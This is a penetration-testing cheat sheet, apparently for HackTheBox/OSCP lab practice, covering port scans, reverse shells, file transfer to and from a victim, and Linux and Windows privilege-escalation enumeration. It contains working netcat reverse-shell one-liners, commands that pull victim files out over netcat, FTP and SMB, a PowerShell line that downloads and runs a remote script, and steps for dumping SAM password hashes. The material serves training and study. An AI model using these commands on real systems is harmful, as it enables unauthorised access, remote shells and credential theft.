#   Strategy

*******

## 1) Port scans 
Nmap short, quick, SYN scan —

nmap -sCSV ipaddress -oA synscan

Nmap full, TCP SYN/ACK, relatively slow scan —

nmap -sTV -p- -Pn ipaddress -oA fulltcp

Using masscan, you can scan all TCP and UDP ports in roughly 2-3 minutes.

masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0

-p1-65535,U:1-65535 tells masscan to scan all TCP/UDP ports
--rate=1000 scan rate = 1000 packets per second
-e tun0 tells masscan to listen on the VPN network interface for responses

Once you have a list of valid ports from masscan, you can feed them to nmap for service enumeration. For example, if masscan finds ports 80, 443 and 3306 open, the nmap command would be:

nmap -sV -p80,443,3306 10.10.10.x

******

## 2) Reverse Shell 

[Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html)

[Spawning TTY Shell](https://netsec.ws/?p=337)


- Netcat Listeners

Netcat Traditional

``` nc -e /bin/sh [IPADDR] [PORT] ```

``` nc.traditional -e /bin/bash 10.0.0.1 4444 ```

Netcat OpenBsd

``` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f ```

Ncat

``` ncat 127.0.0.1 4444 -e /bin/bash ```

``` ncat --udp 127.0.0.1 4444 -e /bin/bash ```


- Shell Spawning

    ```python -c 'import pty; pty.spawn("/bin/sh")'```
    

   ``` echo os.system('/bin/bash')```
   

   ``` /bin/sh -i ```
   

   ``` perl —e 'exec "/bin/sh";' ```
   
   ``` perl: exec "/bin/sh"; ```
   
 ``` ruby: exec "/bin/sh" ```
    

  ``` lua: os.execute('/bin/sh') ```

   ``` (From within IRB) ```

   ``` exec "/bin/sh" ```

   ``` (From within vi) ```

   ``` :!bash ```

   ``` (From within vi) ```

   ``` :set shell=/bin/bash:shell ```

  ```   (From within nmap) !sh ```


********************

## 3) File Transfer In Windows and Linux


[File Transfer Cheatsheet](https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)

[Kali to windows](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)

 - Linux
    - Upload files to the victim

        - Simple HTTP Server

With this method we will host our file to upload with a simple python server, which could also be hosted by any other server but we will use this for its simplicity, and then download it with wget in the victim (or curl if it is not installed).



     -   Attacking machine command:
       	
  ```  python -m SimpleHTTPServer 80 ```
  

     -   Victim machine command:
        
        	
   ``` wget http://192.168.1.35/FiletoTransfer ```

or 
        	
   ```     curl -o FiletoTransfer http://192.168.1.35/FiletoTransfer ```

      -  SCP(SSH utility)

        This method will only be valid if the target machine has ssh and we have the credentials.
        We will use the scp utility to transfer the file



      -  Attacking machine command:
       
        	
     ```   scp FiletoTransfer tester@192.168.1.39:/home/tester/iron/ ```

        Netcat

        We will use the tool that is known as the Swiss knife of the hacker, netcat.
        Most computers with linux have it installed so this is an advantage.



        Victim machine command:
        
        	
      ```  nc -lvp 4444 > FiletoTransfer  ```

        Attacking machine command:
        
        	
      ```  nc 192.168.1.39 4444 -w 3 < FiletoTransfer ```

        FTP

        We will mount a temporary ftp (we could use a conventional ftp) using the twistd utility to access from the victim and download the file



        Attacking machine command:
        
        	
     ```   twistd -n ftp -r . ```

        Victim machine command:
        
        	
    ```    wget ftp://192.168.1.35:2121/FiletoTransfer ```

###  - Download victim files

        - Simple Server HTTP

        This method is the same as it is to upload a file but the other way around. In this case the victim machine must have python to run the simple server.
        We have to take into account that we will not have permits to lift any port.
        We could also move our file to the web server folder if, for example, it has the apache running, although for that we should have permissions.



        Victim machine command:
        
        	
     ```   python -m SimpleHTTPServer 8080 ```

        Attacking machine command:
        
        	
     ```   wget http://192.168.1.39:8080/FiletoDownload  ```

        Netcat

        We will also use the netcat tool in reverse order to upload the file to the victim machine.
        It is important to take into account the permits on the ports to be used.



        Attacking machine command:
        
        	
      ```  nc -lvp 4444 > FiletoDownload  ```

        Victim machine command:
        
        	
     ```   nc 192.168.1.35 4444 -w 3 < FiletoDownload ```

        SCP(SSH utility)

        This method will only be valid if the target machine has ssh and we have the credentials.
        We will use the scp utility to transfer the file from the victim machine to ours.



        Attacking machine command:
        
        	
      ```  scp tester@192.168.1.39:/home/tester/iron/FiletoDownload ```

Windows

    Upload files to the victim

        Powershell DownloadFile

        With this method we will host our file to upload with a simple python server, which could also be hosted by any other server but we will use this for its simplicity, and then download it with the DownloadFile function of powershell.



        Attacking machine command:
        
        	
     ```   python -m SimpleHTTPServer 8080  ```

        Victim machine command:
        
        	
     ```   powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.10.10.1:8080/FiletoTransfer','C:\Users\test\Desktop\FiletoTransfer')"   ```

     ```   Certutil.exe  ```

        With our hosted file we will use the Microsoft tool certutil.exe to download the file we want. This tool is designed to download certificates but as we saw in this post can be used for more things.



        Attacking machine command:
        
        	
     ```   python -m SimpleHTTPServer 8080  ```

        Victim machine command:
        
        	
      ```  certutil.exe -urlcache -split -f http://10.10.10.1:8080/FiletoTransfer FiletoTransfer  ```

        Netcat

        This method is similar to the one used in netcat with linux. In order to make the transfer in this way we must have the netcat binary for our windows.



        Victim machine command:
        
        	
     ```   nc.exe -lvp 4444 > FiletoTransfer  ```

        Attacking machine command:
        
        	
   ```     nc 10.10.10.2 4444 -w 3 < FiletoTransfer  ```

        FTP

        We will use a temporary FTP to host our file.
        Windows has an FTP client pre-installed so we will connect and download the desired file. Our shell may not be interactive and we have to use a command file to connect and download the file.



        Attacking machine command:
        
        	
```shell   twistd -n ftp -r ```

        Victim machine command:

```console
        ftp
        open 10.10.10.1 2121
        anonymous
        get FiletoTransfer
        bye
        
```

        SMB

        Through impacket-smbserver we will mount a smb folder on our machine, which we will access from the victim machine, downloading the file.



        Attacking machine command:
        
        	
```        impacket-smbserver -smb2support test ```

        Victim machine command:
        
        	
```        copy \\10.10.10.1:8080\FiletoTransfer FiletoTransfer  ```

    Download victim files

        FTP

        With this method we will mount a temporary FTP in the folder where our file is located but this time with write permission.
        Later we will access from the victim and upload our file.



        Attacking machine command:
        
        	
```        python -m pyftpdlib -w ```

        Victim machine command:

```shell
        ftp
        open 10.10.10.1 2121
        anonymous
        put FiletoDownload
        bye
```

        Netcat

        This method is similar to the one used in netcat to upload files but in reverse. In order to make the transfer in this way we must have the netcat binary for our windows.



        Attacking machine command:
        
        	
```        nc -lvp 4444 > FiletoDownload ```

        Victim machine command:
        
        	
```        nc.exe 10.10.10.1 4444 -w 3 < FiletoDownload  ```

        SMB

        Through impacket-smbserver we will mount a smb folder on our machine that we will access from the victim machine to copy the file to be downloaded in our SMB folder



        Attacking machine command:
        
        	
```        impacket-smbserver -smb2support test ```

        Victim machine command:
        
        	
```        copy  FiletoDownload \\10.10.10.1:8080\FiletoDownload  ```

        Powercat

        In this method we will load in memory the powercat module, a tool with which we can load a shell, send files. In this case we will use it for this same.
        We have the powercat.ps1 file hosted on our machine and load it using the DownloadString function. We execute powercat to send the file and through wget we download it in our machine.
        We will see that the download never ends but we will cancel it when it may have finished depending on the size of the file.



        Victim machine command:
        
        	
```        powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoDownload"   ```

        Attacking machine command:
        
        	
```       wget http://10.10.10.2:4444/FiletoDownload   ```

Tools:
netcat, impacket, pyftpdlib, powercat, twistd

***************
## 4) Linux Enumeration:

Forget about kernel exploits. HTB’s linux machines are *almost* never vulnerable to kernel exploits. so.. enumeration, enumeration and enumeration.
1. start with very basics, check /etc/passwd for existing users, check home directories and files owned by those users.

2. Can you run a binary/script with sudo? check with $ sudo -l

3. Check for SUID files — $ find / -perm -4000 2>/dev/null

4. Any cron jobs running? cat /etc/crontab or crontab -l ; pspy tool can also be used to find any binary/scripts that are being run repeatedly. Simply download it from https://github.com/DominicBreuker/pspy/releases, copy it to the target machine and run.

5. Still found nothing that leads to privesc? Copy LinEnum.sh (https://github.com/rebootuser/LinEnum) script and run it. Read all outputs line by line, you’ll find something fishy. (LinEnum.sh can be run with -t argument for more thorough test)

6. Found a weird binary (SUID or with sudo permissions)? Don’t know how to abuse it to get shell? GTFObins comes to rescue. Let’s say you can run /usr/bin/node binary as sudo but you don’t know how to use that to pop a root shell then search for “node” in https://gtfobins.github.io and you’ll get plenty of information which will help you to escalate privileges.

7. Lastly, I can’t recommend g0tmi1k’s cheatsheet enough for privesc.

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)


********
## 5) Windows Enumeration:

Windows has it’ s own different world than linux but concept is same — find files with weak permissions, vulnerable programs, programs running with higher level of privileges and so on.

1. Windows boxes might be vulnerable to kernel exploits. To find info about running operating system, service pack and installed hotfixes, “systeminfo” command can be used. Once you have OS and service pack info, you can google it and get an exploit. Some precompiled exploits:
- https://github.com/abatchy17/WindowsExploits
- https://github.com/SecWiki/windows-kernel-exploits

To find exploits corresponding to the installed hotfixes, Sherlock script can also be used https://github.com/rasta-mouse/Sherlock

2. Manual enumeration can be started with users. “net users” to list all the users and “net user username” to get info about one specific user. Do you have a shell with Administrator privs? Leaked credentials for higher privs users?

3. Windows equivalent of /etc/shadow —

Windows stores user hashes in C:\Windows\System32\config\SAM file, users with low privs can’t access it but there maybe some cases where you can read it. In that case, grab C:\Windows\System32\config\SYSTEM file too and use samdump2 utility in kali.
$ samdump2 SYSTEM SAM
Above command will generate a list of user along with their hashes which can be cracked with john/hashcat or directly used with Pass The Hash technique

Further reading — https://blog.ropnop.com/practical-usage-of-ntlm-hashes/

4. Check for installed programs in C:\Program Files or sometimes Desktop directory too. There maybe some vulnerable programs installed which can help to escalate privileges.

Quick cheatsheet for windows privesc & references -https://guif.re/windowseop) guif.re/windowseop


***********
### Hacking Boxes Guide

- Lame
- Beep
- Bastard
- Grandpa/Granny
- Mirai
- Solidstate
- Jeeves
- Tally (Much harder than anything on OSCP, but you've gotta get used to windows)
- Bashed
- Nibbles
- Sense
- Valentine
- Bart (Again, same issue but really get used to windows)
- Chatterbox
- Popcorn
- Haircut
- Nineveh
- Shocker

### Linux Boxes 
- Lame
- brainuck
- shocker
- bashed
- nibbles
- beep
- cronos
- nineveh
- sense
- solidstate
- kotarak
- node
- valentine
- poison
- sunday
- tartarsauce

### Windows Boxes
- Legacy 
- Blue
- Devel
- Optimum
- Bastard
- granny
- Arctic
- silo
- bounty
- jerry

### More challenging then oscp but good to practice.
- Jeeves[Windows]
- Bart[Windows]
- Tally[Windows]
- Active[Windows]
- Jail[Linux]
- falfel[Linux]
- Devops[Linux]
- Hawk[Linux]

    